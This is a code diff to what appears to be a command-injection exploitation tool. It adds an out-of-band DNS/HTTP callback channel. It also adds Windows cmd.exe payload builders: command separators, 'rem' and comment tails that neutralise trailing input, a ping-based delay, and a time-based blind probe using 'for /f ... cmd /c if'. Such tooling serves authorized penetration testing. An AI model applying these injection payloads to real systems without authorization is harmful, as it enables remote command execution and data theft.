@@ -125,7 +125,8 @@ def injection_techniques_status():
      settings.EVAL_BASED_STATE != True and \
      settings.TIME_BASED_STATE != True and \
      settings.FILE_BASED_STATE != True and \
-     settings.TEMPFILE_BASED_STATE != True :
+     settings.TEMPFILE_BASED_STATE != True and \
+     settings.OOB_STATE != True :
     return False
   else:
     return True
@@ -354,12 +355,23 @@ def metasploit_missing():
   return True
 
 """
-Suggest '--os-shell', unless it is already in play.
+Suggest '--os-shell', unless it is already in play. Held back rather than printed here: it is
+advice about the next run, so it belongs with the last lines of this one and not in the middle of
+the output of whatever the finding is being used for.
 """
 def suggest_os_shell():
   if not menu.options.os_shell:
-    info_msg = "Re-run with the '--os-shell' switch to access a command shell."
-    settings.print_data_to_stdout(settings.print_warning_msg(info_msg))
+    settings.OS_SHELL_SUGGESTION_PENDING = True
+
+"""
+Print the held-back '--os-shell' suggestion, once, wherever the run ends.
+"""
+def flush_os_shell_suggestion():
+  if not settings.OS_SHELL_SUGGESTION_PENDING:
+    return
+  settings.OS_SHELL_SUGGESTION_PENDING = False
+  warn_msg = "Re-run with the '--os-shell' switch to access a command shell."
+  settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
 
 """
 Quit - hard_exit ends the process immediately (os._exit), otherwise SystemExit unwinds normally.
@@ -378,6 +390,7 @@ def quit(filename, url, hard_exit):
     entry = settings.PENDING_OS_SHELL_ENTRY
     settings.PENDING_OS_SHELL_ENTRY = None
     entry()
+  close_oob_channel()
   # Only ask to delete the output file now, at actual exit.
   for cleanup_fn in list(settings.PENDING_FILE_CLEANUPS.values()):
     cleanup_fn()
@@ -1055,10 +1068,24 @@ Reduce a technique name to its bare name for the summary block's "Technique:" li
 drops the "command injection"/"injection" filler word and the trailing "technique" word.
 """
 def summary_technique_label(technique):
-  technique = short_technique_label(technique)
-  if technique.endswith(" technique"):
-    technique = technique[:-len(" technique")]
-  return technique[0].upper() + technique[1:]
+  label = short_technique_label(technique)
+  if label.endswith(" technique"):
+    label = label[:-len(" technique")]
+  label = label[0].upper() + label[1:]
+  if technique == settings.INJECTION_TECHNIQUE.OOB and oob_channel_label():
+    label += " (" + oob_channel_label() + ")"
+  return label
+
+"""
+Name the channel an out-of-band finding came back over - a name lookup, or an HTTP(S) request.
+"""
+def oob_channel_label(transport=None):
+  transport = transport or settings.OOB_TRANSPORT
+  if not transport:
+    return ""
+  if transport == "dns":
+    return "DNS"
+  return (settings.OOB_SCHEME or "https").upper()
 
 """
 Name the boundary combination a finding was confirmed with - logged, not printed.
@@ -1202,11 +1229,32 @@ def continue_tests(err):
     raise
 
 """
+The options a Windows target cannot serve, already reported.
+"""
+UNAVAILABLE_OPTIONS = set()
+
+"""
 Check if option is unavailable
 """
 def unavailable_option(check_option):
+  # Reported once, wherever it was first said - the users enumeration says it in passing.
+  if check_option in UNAVAILABLE_OPTIONS:
+    return
+  UNAVAILABLE_OPTIONS.add(check_option)
   warn_msg = "The option '" + check_option + "' "
   warn_msg += "is currently not supported on Windows targets."
+  settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+
+"""
+No permission to list the target's users - said together with the password enumeration that a
+Windows target cannot serve either, so the two do not take a line each.
+"""
+def no_user_enumeration_permission():
+  warn_msg = "It seems you do not have permission to enumerate operating system users"
+  if settings.TARGET_OS == settings.OS.WINDOWS and menu.options.passwords:
+    warn_msg += ", and the option '--passwords' is not supported on Windows targets"
+    UNAVAILABLE_OPTIONS.add("--passwords")
+  warn_msg += "."
   settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
 
 """
@@ -1633,7 +1681,7 @@ def check_lagging():
     if len(settings.RESPONSE_TIMES) > 1 and statistics.pstdev(settings.RESPONSE_TIMES) > settings.WARN_TIME_STDEV:
       settings.LAGGING_DETECTED = settings.JITTER_SEEN = settings.ADJUST_TIME_DELAY_DISABLED = True
       warn_msg = "Detected considerable lagging in the connection response(s). "
-      warn_msg += "Consider using a higher '--time-sec' value (e.g. 10 or more)."
+      warn_msg += "Consider using a higher '--time-sec' value (e.g. '10' or more)."
       settings.print_data_to_stdout(settings.print_critical_msg(warn_msg))
   return settings.LAGGING_DETECTED
 
@@ -1858,6 +1906,10 @@ def tamper_modify_letters_outside_quotes(payload, repl):
 Apply "transform" outside single-quoted spans only - single quotes suppress expansion, so anything injected there stays literal and corrupts the argument.
 """
 def tamper_outside_single_quotes(payload, transform):
+  # cmd.exe gives a single quote no meaning of its own, so a span in them is not a literal to be
+  # left alone - the whitespace inside a 'for /f' command would go out unencoded.
+  if settings.TARGET_OS == settings.OS.WINDOWS:
+    return transform(payload)
   parts = re.split(r"('[^']*')", payload)
   return "".join(part if part.startswith("'") else transform(part) for part in parts)
 
@@ -1945,7 +1997,8 @@ def tamper_scripts(stored_tamper_scripts):
     elif len([x for x in provided_scripts if any(y in x for y in ["nested", "doublequotes"])]) == 2 and not settings.LOAD_SESSION:
       _ = True
       warn_msg = "The combination of the provided tamper scripts "
-    if _:
+    if _ and not settings.TAMPER_WARNING_SHOWN:
+      settings.TAMPER_WARNING_SHOWN = True
       warn_msg += "is not a good idea (may cause false positive / negative results)."
       settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
 
@@ -2598,13 +2651,11 @@ def print_users(sys_users, filename, _, separator, TAG, cmd, prefix, suffix, whi
             logs.add_line(filename, "  * " + name, group="users")
             logs.report_add_enumeration("users", name)
       else:
-        warn_msg = "It seems you do not have permission to enumerate operating system users."
-        settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+        no_user_enumeration_permission()
     except TypeError:
       pass
     except IndexError:
-      warn_msg = "It seems you do not have permission to enumerate operating system users."
-      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+      no_user_enumeration_permission()
       pass
 
   # Unix-like users enumeration.
@@ -3212,6 +3263,89 @@ def init_keep_alive():
     settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
 
 """
+Bring the out-of-band channel up, once, on first use.
+"""
+def init_oob_channel():
+  if settings.OOB_CHANNEL is not None:
+    return settings.OOB_CHANNEL
+  settings.OOB_SERVER = menu.options.oob_server or ""
+  settings.OOB_TOKEN = menu.options.oob_token or ""
+  if menu.options.oob_transport:
+    from src.core.injections.blind.techniques.oob import oob_payloads as oob_payloads
+    transport = str(menu.options.oob_transport).strip().lower()
+    known = oob_payloads.WINDOWS_TRANSPORTS if settings.TARGET_OS == settings.OS.WINDOWS else oob_payloads.UNIX_TRANSPORTS
+    if transport not in known:
+      err_msg = "The option '--oob-transport' takes one of: " + ", ".join("'" + _ + "'" for _ in known) + "."
+      settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
+      raise SystemExit()
+    settings.OOB_TRANSPORT = transport
+  for option, attribute in (("--oob-timeout", "OOB_TIMEOUT"), ("--oob-poll", "OOB_POLL_INTERVAL")):
+    value = menu.options.oob_timeout if attribute == "OOB_TIMEOUT" else menu.options.oob_poll
+    try:
+      value = int(value)
+    except (TypeError, ValueError):
+      value = 0
+    if value < 1:
+      err_msg = "The option '" + option + "' must be a positive integer number of seconds."
+      settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
+      raise SystemExit()
+    setattr(settings, attribute, value)
+
+  # A wait can only observe an interaction if a poll falls inside it, after the interaction lands.
+  # Polling no more often than the wait would leave that to chance, and a missed one is not a slow
+  # result but a lost finding - '--smart' drops the parameter on a negative heuristic.
+  if settings.OOB_POLL_INTERVAL * 2 > settings.OOB_TIMEOUT:
+    adjusted = max(1, settings.OOB_TIMEOUT // 2)
+    if adjusted != settings.OOB_POLL_INTERVAL:
+      warn_msg = "Polling every " + str(settings.OOB_POLL_INTERVAL) + " second"
+      warn_msg += "s"[settings.OOB_POLL_INTERVAL == 1:]
+      warn_msg += " is too seldom for a " + str(settings.OOB_TIMEOUT) + "-second wait, so "
+      warn_msg += "interactions could be missed. Polling every " + str(adjusted) + " second"
+      warn_msg += "s"[adjusted == 1:] + " instead."
+      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+      settings.OOB_POLL_INTERVAL = adjusted
+
+  from src.core.oob import provider
+  channel = provider.build()
+  try:
+    channel.start()
+  except SystemExit:
+    raise
+  except Exception as err:
+    err_msg = provider.tls_error(err) or ("Unable to reach the out-of-band server (" + str(err) + ").")
+    settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
+    raise SystemExit()
+  settings.OOB_CHANNEL = channel
+  # The server is reached over both, so what the payloads use is the target's side of the choice:
+  # a host with no TLS of its own, or one that only lets 443 out, needs the other one.
+  settings.OOB_SCHEME = channel.scheme
+  settings.OOB_PORT = getattr(channel, "port", None)
+  if menu.options.oob_scheme:
+    scheme = str(menu.options.oob_scheme).strip().lower().rstrip(":/")
+    if scheme not in ("http", "https"):
+      err_msg = "The option '--oob-scheme' takes either 'http' or 'https'."
+      settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
+      raise SystemExit()
+    settings.OOB_SCHEME = scheme
+  settings.OOB_IGNORE_TIMEOUT = True
+  notice = channel.server_notice()
+  if notice:
+    settings.print_data_to_stdout(settings.print_info_msg(notice))
+  return channel
+
+"""
+Tear the out-of-band channel down.
+"""
+def close_oob_channel():
+  if settings.OOB_CHANNEL is not None:
+    if not settings.OOB_CHANNEL.seen_any and settings.OOB_STATE != True:
+      warn_msg = "No interaction of any kind reached the out-of-band server, so the channel itself "
+      warn_msg += "was never proven to work. Check the target's egress and the channel's settings."
+      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+    settings.OOB_CHANNEL.stop()
+    settings.OOB_CHANNEL = None
+
+"""
 Apply the optimization switches ('-o').
 """
 def set_optimize():
@@ -3334,6 +3468,9 @@ def technique_label(injection_type, technique):
   name = short_technique_label(technique)
   if name.endswith(" technique"):
     name = name[:-len(" technique")]
+  # The channel belongs with the technique's own name, ahead of the injection type.
+  if technique == settings.INJECTION_TECHNIQUE.OOB and oob_channel_label():
+    name += " (" + oob_channel_label() + ")"
   return name + settings.SINGLE_WHITESPACE + injection_type.split(settings.SINGLE_WHITESPACE)[0] + " technique"
 
 """
@@ -3565,6 +3702,126 @@ Error msg if the attack vector is available only for Windows targets.
 def windows_only_attack_vector():
     error_msg = "This attack vector is available only for Windows targets."
     settings.print_data_to_stdout(settings.print_error_msg(error_msg))
+
+"""
+The operator a Windows payload starts with, or None when the separator does not chain commands in
+cmd.exe at all - ';', a newline and Ctrl-Z do not, so there is no payload to build for those.
+"""
+WINDOWS_SEPARATORS = ("%26", "%26%26", "|", "||", "")
+
+def windows_separator(separator):
+  return separator if separator in WINDOWS_SEPARATORS else None
+
+"""
+Report whether the target's shell runs a second command after this separator at all. A name lookup
+can still betray an injection point through one that does not - cmd.exe reads ';' as an argument
+separator, so the payload lands as another argument of the target's own command - but nothing can
+be run through it afterwards.
+"""
+def separator_chains(separator):
+  if settings.TARGET_OS == settings.OS.WINDOWS:
+    return windows_separator(separator) is not None
+  return True
+
+"""
+The operator a payload chains its own commands with, once it has started with the separator under
+test. Unconditional, unlike '||' and '|', so every part runs no matter how the first one ended.
+"""
+WINDOWS_CHAIN = "%26"
+
+"""
+What a Windows payload ends with when its last token is a filename or a quoted literal. cmd.exe has
+no comment character, but 'rem' ignores whatever follows it, so anything the target's own command
+line carries after the payload - a closing quote, another argument - lands there instead of inside
+that token.
+"""
+WINDOWS_TAIL = WINDOWS_CHAIN + "rem" + settings.SINGLE_WHITESPACE
+
+"""
+The same, for a POSIX shell: '#' starts a comment, so an unterminated quote or a leftover argument
+after the payload is read as one too, instead of swallowing the payload's own last token.
+"""
+UNIX_TAIL = settings.SINGLE_WHITESPACE + settings.COMMENT
+
+"""
+End a payload so that whatever the target's own command line carries after it is ignored.
+"""
+def shell_tail():
+  return WINDOWS_TAIL if settings.TARGET_OS == settings.OS.WINDOWS else UNIX_TAIL
+
+"""
+Hold the answer back for a number of seconds, without starting a PowerShell process.
+
+'ping' waits about a second between echoes, so one more than the delay takes that many seconds. It
+is on every Windows, including the versions that have no 'timeout' command, and it starts at once -
+where a PowerShell launch costs a second or two of its own and varies from call to call, which is
+noise a timing measurement cannot afford.
+"""
+def windows_sleep(timesec):
+  return ("ping -n " + str(int(timesec) + 1) + settings.SINGLE_WHITESPACE + "127.0.0.1"
+          + settings.SINGLE_WHITESPACE + ">nul")
+
+"""
+Whether the decision payload holds the answer back for one candidate length alone. The Windows one
+compares the marker straight back instead of measuring its length, so every candidate is answered
+the same way - and the shape of a sample of those says nothing about a false positive.
+"""
+def decision_is_length_based():
+  return settings.TARGET_OS != settings.OS.WINDOWS
+
+"""
+The delay a time-related payload asks the target for, in seconds. The same on either target: the
+answer is told apart from an undelayed one by a threshold that sits just above the target's own
+response times, so seconds beyond that are paid on every probe of every character for nothing.
+"""
+def injected_delay(timesec):
+  return int(timesec)
+
+"""
+Read a value off a Windows command and hold the answer back when it stands in the given relation
+('EQU', 'GEQ', ...) to the expected one.
+"""
+def windows_probe(chain, cmd, operator, expected, timesec):
+  # Quoted, so that an operator inside the command stays part of it - but left alone when the
+  # command carries double quotes of its own, which cmd.exe would then pair up with the added ones.
+  if "\"" not in cmd:
+    cmd = "\"" + cmd + "\""
+  # The tail matters more here than anywhere else: the delay is asked for by a command that ends in
+  # a redirection, and a closing quote the target's own command line carries after it would be read
+  # as part of the redirect's filename - which fails, so the delay never happens and the answer
+  # comes back on time as if nothing had been injected.
+  # Run through 'cmd /c', or the comparison is lost whenever the payload starts on a pipe: the shell
+  # a pipe spawns for its right-hand side has no command extensions, and 'EQU'/'GEQ' are one - the
+  # test then never runs, no delay is asked for, and the separator reads as not injectable.
+  return (chain +
+          "for /f \"tokens=*\" %i in ('cmd /c " + cmd + "') do cmd /c if %i " + operator +
+          settings.SINGLE_WHITESPACE + str(expected) + settings.SINGLE_WHITESPACE +
+          windows_sleep(timesec) + WINDOWS_TAIL)
+
+"""
+Report whether an interaction carries the result of the sum the payload asked the target to work
+out. Without a sum to check, any interaction counts.
+"""
+def oob_proof_holds(interactions, expected):
+  if not expected:
+    return bool(interactions)
+  for interaction in interactions:
+    lines = (interaction.raw_request or "").splitlines()
+    # Only the request line, so that a number appearing in a header cannot stand in for the result.
+    if lines and expected in lines[0]:
+      return True
+  return False
+
+"""
+Return the body of a raw HTTP request captured by an out-of-band server.
+"""
+def oob_request_body(raw_request):
+  if not raw_request:
+    return ""
+  for delimiter in ("\r\n\r\n", "\n\n"):
+    if delimiter in raw_request:
+      return raw_request.split(delimiter, 1)[1]
+  return ""
 
 """
 Append the separator once more if a custom injection marker changed where the payload lands - the shared tail repeated across every payloads.py.
